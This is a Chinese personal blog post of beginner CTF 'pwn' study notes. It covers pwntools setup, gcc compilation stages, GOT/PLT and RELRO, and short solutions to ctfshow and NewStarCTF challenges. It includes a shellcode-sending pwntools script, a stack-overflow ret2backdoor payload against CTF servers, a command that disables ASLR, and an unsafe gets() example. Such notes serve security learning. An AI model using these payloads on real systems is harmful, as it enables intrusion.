@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN | xhy的个人博客</title><meta name="author" content="xhy"><meta name="copyright" content="xhy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="工具安装 pwntools安装sudo apt update &amp;&amp; sudo apt install python3-pwntools -y 脚本名字不要叫pwn，不然import会失败 PWN 编译原理 预处理–编译–汇编–链接 ** gcc常用命令 -safe-temps 可保留中间产生的.i.s.o文件** ** –verebose：输出详细工作流程** 预处理 gcc- E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN">
+<meta property="og:url" content="https://bloodhound812.github.io/2024/11/10/PWN/index.html">
+<meta property="og:site_name" content="xhy的个人博客">
+<meta property="og:description" content="工具安装 pwntools安装sudo apt update &amp;&amp; sudo apt install python3-pwntools -y 脚本名字不要叫pwn，不然import会失败 PWN 编译原理 预处理–编译–汇编–链接 ** gcc常用命令 -safe-temps 可保留中间产生的.i.s.o文件** ** –verebose：输出详细工作流程** 预处理 gcc- E">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bloodhound812.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2024-11-10T12:00:49.000Z">
+<meta property="article:modified_time" content="2024-11-10T12:02:50.339Z">
+<meta property="article:author" content="xhy">
+<meta property="article:tag" content="摄影 汽车 网络空间安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bloodhound812.github.io/img/butterfly-icon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://bloodhound812.github.io/2024/11/10/PWN/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">xhy的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-10T12:00:49.000Z" title="发表于 2024-11-10 20:00:49">2024-11-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-10T12:02:50.339Z" title="更新于 2024-11-10 20:02:50">2024-11-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><strong>工具安装</strong></p>
+<p>pwntools安装sudo apt update &amp;&amp; sudo apt install python3-pwntools -y</p>
+<p>脚本名字不要叫pwn，不然import会失败</p>
+<p><strong>PWN</strong></p>
+<p>编译原理</p>
+<p><strong>预处理–编译–汇编–链接</strong></p>
+<p>** gcc常用命令 -safe-temps 可保留中间产生的.i.s.o文件**</p>
+<p>** –verebose：输出详细工作流程**</p>
+<p><strong>预处理 gcc- E hello.c -o hello.i</strong></p>
+<p>处理所有条件编译指令 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9D%A1%E4%BB%B6%E7%BC%96%E8%AF%91/7692959">条件编译是一种编程技术，它允许编译器根据特定的条件选择性地编译源代码的某部分</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9D%A1%E4%BB%B6%E7%BC%96%E8%AF%91/7692959">1</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/wordwarwordwar/article/details/84932183">。这些条件通常是预处理指令，例如#if、#ifdef、#ifndef、#elif、#else和#endif</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/wordwarwordwar/article/details/84932183">2</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/klb561/p/9256408.html">3</a>。</p>
+<p>这种技术在编程中非常有用，因为它可以让你根据不同的环境和配置选择性地编译代码。例如，你可能有一些代码只在调试模式下才需要，或者有一些代码只在特定的操作系统或硬件配置下才需要。通过使用条件编译，你可以确保只有在满足特定条件时，这些代码才会被编译和执行。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wordwarwordwar/article/details/84932183">以下是一些常见的条件编译指令的用法</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/wordwarwordwar/article/details/84932183">：</a></p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">#if：如果给定的条件为真，则编译后面的代码。</font></li>
+<li><font style="color:rgb(0, 0, 0);">#ifdef：如果定义了某个宏，则编译后面的代码。</font></li>
+<li><font style="color:rgb(0, 0, 0);">#ifndef：如果没有定义某个宏，则编译后面的代码。</font></li>
+<li><font style="color:rgb(0, 0, 0);">#elif：如果前面的</font><strong><font style="color:rgb(0, 0, 0);">#if</font></strong><font style="color:rgb(0, 0, 0);">或</font><strong><font style="color:rgb(0, 0, 0);">#ifdef</font></strong><font style="color:rgb(0, 0, 0);">的条件不满足，但当前的条件满足，则编译后面的代码。</font></li>
+<li><font style="color:rgb(0, 0, 0);">#else：如果前面的所有条件都不满足，则编译后面的代码。</font></li>
+<li><font style="color:rgb(0, 0, 0);">#endif：结束一个条件编译块。</font></li>
+</ul>
+<p>保留pargma编译指令</p>
+<p><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/cpp/Pragmas.html">#pragma是一种编译器指令，它用于向编译器提供额外的信息，这些信息超出了语言本身所能传达的内容</a><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/cpp/Pragmas.html">1</a><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/cpp/Pragmas.html">。#pragma指令是C标准规定的方法，用于提供额外的编译器信息</a><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/cpp/Pragmas.html">1</a><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/cpp/Pragmas.html">。C编译器可以自由地为其他#pragma附加任何它喜欢的含义</a><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/cpp/Pragmas.html">1</a>。</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/232785/use-of-pragma-in-c">#pragma用于机器特定或操作系统特定的编译器指令，即它告诉编译器做某事，设置某个选项，采取某些行动，覆盖某些默认设置等，这些可能适用于所有机器和操作系统，也可能不适用</a><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/232785/use-of-pragma-in-c">2</a>。</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/232785/use-of-pragma-in-c">例如，你可能有一些代码只在调试模式下才需要，或者有一些代码只在特定的操作系统或硬件配置下才需要。通过使用#pragma，你可以确保只有在满足特定条件时，这些代码才会被编译和执行</a><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/232785/use-of-pragma-in-c">2</a>。</p>
+<p>#include </p>
+<p>#pragma warning(disable:4996)</p>
+<p>int main() {</p>
+<p>char str[10];</p>
+<p>printf(“Enter a string: “);</p>
+<p>gets(str);</p>
+<p>printf(“You entered: %s\n”, str);</p>
+<p>return 0;</p>
+<p>}</p>
+<p>在这个例子中，**#pragma warning(disable:4996)<strong>是一个编译器指令，它告诉编译器禁用编号为4996的警告。这个警告通常会在你使用被认为不安全的函数（如</strong>gets<strong>）时出现。通过使用这个</strong>#pragma**指令，我们可以在编译时忽略这个警告。</p>
+<p>请注意，**#pragma<strong>的行为取决于你使用的编译器，不同的编译器可能会对同一个</strong>#pragma<strong>指令有不同的解释。在这个例子中，</strong>#pragma warning(disable:4996)<strong>是微软的Visual C++编译器特有的。其他编译器可能不支持这个指令，或者可能需要使用不同的指令来达到同样的效果。希望这个例子能帮助你理解</strong>#pragma**的用法！</p>
+<p><strong>编译 gcc -S -masm&#x3D;intel hello.i -o hello.s</strong></p>
+<p><strong>汇编 gcc -c hello.s -o hello.o</strong></p>
+<p>此时不能直接打开 需要用 objdump -sd hello.o</p>
+<p><font style="color:rgb(77, 77, 77);">.s文件，是汇编语言的源程序文件</font></p>
+<p><strong>链接 gcc -hello.o -o hello.out</strong></p>
+<p>文件头</p>
+<p>.text段 <font style="color:rgb(51, 51, 51);">程序源代码编译后，执行语句变成机器指令，保存在</font></p>
+<p>.data段 存储已初始化的全局变量和静态变量</p>
+<p>.bss段 存储未初始化的全局变量和未初始化的静态变量</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_73985089/article/details/137199087">格式化字符串漏洞原理及其利用（附带pwn例题讲解）_nsm格式化字符串漏洞-CSDN博客</a></p>
+<p>ubantu安装pwntools</p>
+<p>$ apt-get update</p>
+<p>$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</p>
+<p>$ python3 -m pip install –upgrade pip</p>
+<p>$ python3 -m pip install –upgrade pwntools</p>
+<p><img src="https://blogimage812.oss-cn-hangzhou.aliyuncs.com/1731239978337.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/glhdbk/article/details/100595050">绕过canary原理及其利用方式_栈溢出利用canary 保护绕过-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Morphy_Amo/article/details/122120696">【pwn学习】Canary的各种绕过姿势_pwn canary绕过-CSDN博客</a></p>
+<p>pwntools需要使用Python3打开，python3 – import pwn</p>
+<p><img src="https://blogimage812.oss-cn-hangzhou.aliyuncs.com/1731239982561.jpg"></p>
+<p><strong>例题</strong></p>
+<p><strong>ctfshow pwn0</strong></p>
+<p>ssh连接 ssh <a href="mailto:&#117;&#x73;&#101;&#114;&#x40;&#49;&#x32;&#51;&#x2e;&#52;&#53;&#x2e;&#54;&#x37;&#46;&#x38;&#x39;">&#117;&#x73;&#101;&#114;&#x40;&#49;&#x32;&#51;&#x2e;&#52;&#53;&#x2e;&#54;&#x37;&#46;&#x38;&#x39;</a> -p 2222</p>
+<p>ssh默认端口是22</p>
+<p><strong>ctfshow pwn1</strong></p>
+<p>nc直连 nc pwn.challenge.ctf.show 28131</p>
+<p><strong>ctfshow pwn15</strong></p>
+<p>nasm将asm文件编译为可执行文件</p>
+<p><img src="https://blogimage812.oss-cn-hangzhou.aliyuncs.com/1731239988918.jpg"></p>
+<p>ps：如果生成目标文件时用的命令是nasm -f elf flag.asm -o flag.o，那么默认生成的是32位的flag.o，ld链接时需要加上-m elf_i386，指定链接器使用32位的ELF格式，即</p>
+<p>nasm -f elf flag.asm -o flag.o</p>
+<p>ld -m elf_i386 -s -o flag flag.o</p>
+<p>————————————————</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63576152/article/details/132030376">https://blog.csdn.net/weixin_63576152&#x2F;article&#x2F;details&#x2F;132030376</a></p>
+<p><strong>ctfshow pwn19</strong></p>
+<p><font style="color:rgb(77, 77, 77);">fclose(_bss_start);应该就是题目所说的关闭了输出流，所以正常地输入命令是没有办法回显的</font></p>
+<p>在Linux中，&gt;&amp;0 是一种输入重定向的语法。重定向是一种将命令的输入或输出从默认的位置改为指定位置的方法。在这个语法中，&gt; 符号用于输出重定向，&amp; 符号用于指定文件描述符（File Descriptor）。文件描述符是一个非负整数，用于在Linux中标识打开的文件或数据流。特别地，文件描述符 0 表示标准输入（stdin），它通常与终端或键盘相关联。</p>
+<p>所以，&gt;&amp;0 的含义是将命令的输出重定向到标准输入，也就是将命令的输出内容发送到与终端或键盘关联的地方。一般情况下，输出重定向常用的有 &gt;（覆盖）和 &gt;&gt;（追加）来将输出保存到文件中</p>
+<p>—————————</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63576152/article/details/132030376">https://blog.csdn.net/weixin_63576152&#x2F;article&#x2F;details&#x2F;132030376</a></p>
+<p><strong>ctfshow pwn20</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT_变异扎龙多少钱-CSDN博客</a></p>
+<p><font style="color:rgb(77, 77, 77);">x86架构是小端的字节序</font></p>
+<p><font style="color:rgb(77, 77, 77);">放函数地址的数据表，称为</font><strong><font style="color:rgb(77, 77, 77);">全局偏移表</font></strong><font style="color:rgb(77, 77, 77);">（GOT, </font><font style="color:rgb(78, 161, 219);">Global</font><font style="color:rgb(77, 77, 77);"> Offset Table），而那个额外代码段表，称为</font><strong><font style="color:rgb(77, 77, 77);">程序链接表</font></strong><font style="color:rgb(77, 77, 77);">（PLT，Procedure Link Table）</font></p>
+<p>RELRO机制通过将部分ELF段标记为只读，防止攻击者利用全局偏移表（GOT）和过程链接表（PLT）进行攻击。规定如下：</p>
+<p>当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</p>
+<p>当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</p>
+<p>当RELRO为No RELRO时，表示.got与.got.plt都可写。</p>
+<p><font style="color:rgb(77, 77, 77);">可以通过readelf -S命令查看文件的各个段的详细信息，其中就包括了.got和.got.plt表的地址</font></p>
+<p><strong>ctfshow pwn24</strong></p>
+<p>from pwn import</p>
+<p>#与服务器的pwn文件建立连接</p>
+<p>p remote(“pwn.challenge.ctf.show”,”28165”)</p>
+<p>#利用shellcraft模块生成调用系统shel1(&#x2F;bin&#x2F;sh)的shellcode。这个shellcode可以用于执行命令行命令</p>
+<p>shell asm(shellcraft.sh())</p>
+<p>#向远程发送shellcode</p>
+<p>p.sendline(shell)</p>
+<p>#建立交互式对话</p>
+<p>p.interactive()</p>
+<p><font style="color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space关闭aslr</font></p>
+<p><strong>NewStarCTF 2023 [WEEK 1] PWN</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/133324735">NewStarCTF 2023 WEEK1 pwn AK_newstarctf 题目下载-CSDN博客</a></p>
+<p>from pwn import *</p>
+<p>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)</p>
+<p>#p &#x3D; process(‘.&#x2F;pwn’)</p>
+<p>p &#x3D; remote(‘node4.buuoj.cn’,26188)</p>
+<p>elf &#x3D; ELF(‘.&#x2F;111’)</p>
+<p>backdoor &#x3D;0x4011FB</p>
+<p>payload &#x3D;b’A’*(0X20 +8) +p64(backdoor)</p>
+<p>p.sendline(payload)</p>
+<p>p.interactive()</p>
+<p><strong>行知学院第五届ctf院赛</strong></p>
+<p><font style="color:rgb(213, 215, 215);background-color:rgb(29, 30, 30);">找到程序基地址，又名pie值</font></p>
+<p>checksec:查查保护，发现秘密</p>
+<p>命令：$ pwn checksec &lt;程序&gt;</p>
+<p>如果要在ida找基地址可以使用edit-&gt;segments-&gt;rebase</p>
+<p><strong>IDA</strong></p>
+<p><font style="color:rgb(77, 77, 77);">对16进制”R”一下转化为字符</font></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Bloodhound812.github.io">xhy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bloodhound812.github.io/2024/11/10/PWN/">https://bloodhound812.github.io/2024/11/10/PWN/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Bloodhound812.github.io" target="_blank">xhy的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2024/11/10/MISC/" title="MISC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">MISC</div></div></div></a><a class="pagination-related" href="/2024/11/10/REVERSE/" title="REVERSE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">REVERSE</div></div><div class="info-2"><div class="info-item-1">REVERSE 汇编语言（asm） mov 被赋值方, 要赋的值；  sub 是递减指令，其格式为  sub 目标, 递减的值；  call 为调用指令，其格式为  call 要调用的函数地址；  ret 和  leave 连用是出栈指令，也即代表了一个函数的结束。通常在 masm 里，我们只会看到  ret，leave 并不常见 通常函数的返回值保存在  ax 寄存器里，比如  eax，rax 等； 函数的参数一般按顺序保存在  cx、dx、si 中，在 64 位汇编中，一般按  rcx rdx r8 r9 r10 r11 … 的顺序保存参数 汇编语言显示，后面加一个h；第一个如果是字母，则前面加一个0；例如0ffh 每个核心都有对应一套寄存器 x86 通用寄存器eax ebx ecx edx esp ebp esi edi 段寄存器cs ss ds es fs gs 标志寄存器eflags 指令指针寄存器eip 通用寄存器(通常)    寄存器 用途(通常) 16bit 8bit 编号    EAX 累加器...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xhy</div><div class="author-info-description">一只网安noob</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/bloodhound812" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xihaoyuan812c@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/10/MISC/" title="MISC">MISC</a><time datetime="2024-11-10T12:04:52.000Z" title="发表于 2024-11-10 20:04:52">2024-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/10/PWN/" title="PWN">PWN</a><time datetime="2024-11-10T12:00:49.000Z" title="发表于 2024-11-10 20:00:49">2024-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/10/REVERSE/" title="REVERSE">REVERSE</a><time datetime="2024-11-10T11:51:21.000Z" title="发表于 2024-11-10 19:51:21">2024-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/10/WEB/" title="WEB">WEB</a><time datetime="2024-11-10T11:33:04.000Z" title="发表于 2024-11-10 19:33:04">2024-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/06/free-ai/" title="Free_ai">Free_ai</a><time datetime="2024-11-06T05:10:03.000Z" title="发表于 2024-11-06 13:10:03">2024-11-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By xhy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
